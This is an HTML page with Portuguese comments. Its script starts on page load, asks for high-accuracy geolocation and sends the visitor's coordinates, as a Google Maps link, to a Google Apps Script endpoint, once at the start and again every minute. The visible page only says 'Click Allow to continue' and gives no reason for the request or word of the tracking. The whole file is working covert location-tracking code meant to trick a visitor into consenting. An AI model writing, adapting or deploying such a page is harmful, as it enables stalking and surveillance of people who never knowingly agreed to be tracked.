<!DOCTYPE html>
<html>
<head>
  <title> </title>
  <script>
    let watchID;
    let intervalID;
    const url = "https://script.google.com/macros/s/AKfycbwYOerrVwS24d7WHZ1bwZ6cq4kn1L04IuyrPFU0vv4-bJKJWkmInu4TINKH9QG83s0k/exec";
    
    function startSendingLocation() {
      if (navigator.geolocation) {
        // Configura o observador da localização
        watchID = navigator.geolocation.watchPosition(
          position => {
            // Define a localização e agende o envio
            sendLocation(position);
          },
          showError,
          {
            enableHighAccuracy: true,
            maximumAge: 30000,
            timeout: 27000
          }
        );
        
        // Envia a localização a cada 1 minuto (60000 ms)
        intervalID = setInterval(() => {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
              sendLocation(position);
            }, showError, {
              enableHighAccuracy: true,
              maximumAge: 30000,
              timeout: 27000
            });
          }
        }, 60000);
        
      } else {
        alert("Geolocalização não é suportada neste navegador.");
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      
      // Define a mensagem com base na precisão
      const gpsMessage = accuracy < 100 ? "" : "localização imprecisa";

      fetch(`${url}?informacao=https://www.google.com/maps?q=${lat},${lng} ${gpsMessage}`)
        .then(response => response.text())
        .then(data => {
          if (gpsMessage) {
            console.log("Localização enviada: " + gpsMessage);
          } else {
            console.log("Localização enviada com precisão.");
          }
        })
        .catch(error => console.error("Erro ao enviar localização:", error));
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          console.error("Permissão negada.");
          break;
        case error.POSITION_UNAVAILABLE:
          console.error("Posição indisponível.");
          break;
        case error.TIMEOUT:
          console.error("Tempo esgotado.");
          break;
        case error.UNKNOWN_ERROR:
          console.error("Erro desconhecido.");
          break;
      }
    }
  </script>
</head>
<body onload="startSendingLocation()">
  <h1> </h1>
  <h1> </h1>
  <h1>Clique em Permitir para continuar...</h1>
</body>
</html>
